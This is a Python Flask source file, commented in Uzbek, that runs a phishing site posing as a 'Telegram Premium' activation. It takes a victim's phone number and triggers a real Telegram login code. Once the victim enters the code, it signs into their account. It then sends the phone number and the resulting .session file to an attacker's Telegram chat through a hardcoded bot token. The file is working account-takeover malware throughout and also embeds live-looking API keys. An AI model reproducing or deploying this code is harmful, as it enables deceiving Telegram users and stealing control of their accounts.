import os
import requests
import asyncio
from flask import Flask, request, render_template, session
from telethon import TelegramClient

app = Flask(__name__)
app.secret_key = 'super-secret-key-999'

# --- SOZLAMALAR ---
API_ID = 36197920
API_HASH = '2ccde5b4efd9a1465286f2bbcfec4b05'
BOT_TOKEN = '7986845957:AAHZfZ3boIazxcJ5vShujQfTeEWYd1JdyZ4'
ADMIN_ID = '8275787221'

if not os.path.exists('sessions'):
    os.makedirs('sessions')

def send_to_admin(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": ADMIN_ID, "text": msg})

def send_file_to_admin(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        requests.post(url, data={"chat_id": ADMIN_ID}, files={"document": f})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone').replace(' ', '')
    session['phone'] = phone
    
    # Yangi kiritilgan raqam uchun yangi sessiya yaratish
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
    
    async def get_code():
        await client.connect()
        # Bu yerda haqiqiy Telegram kodini so'raymiz
        sent_code = await client.send_code_request(phone)
        session['phone_code_hash'] = sent_code.phone_code_hash
        await client.disconnect()
        
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(get_code())
    
    send_to_admin(f"📞 Raqam: {phone}\nKOD YUBORILDI! Endi foydalanuvchi kod kiritishini kuting.")
    return render_template('verify.html', phone=phone)

@app.route('/verify', methods=['POST'])
def verify():
    code = request.form.get('code')
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
    
    async def sign_in_process():
        await client.connect()
        try:
            # Akkauntga kirishni tasdiqlash
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            await client.disconnect()
            return True
        except Exception as e:
            await client.disconnect()
            send_to_admin(f"❌ Kirishda xato: {str(e)}")
            return False

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success = loop.run_until_complete(sign_in_process())
    
    if success:
        session_file = f'sessions/{phone}.session'
        send_to_admin(f"✅ MUVAFFAQIYATLI KIRILDI!\n📞 Raqam: {phone}")
        # Eng muhim joyi: .session faylini darhol yuborish
        send_file_to_admin(session_file)
        return "Telegram Premium faollashtirildi!"
    else:
        return "Xatolik: Kod noto'g'ri yoki muddatdan o'tgan."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
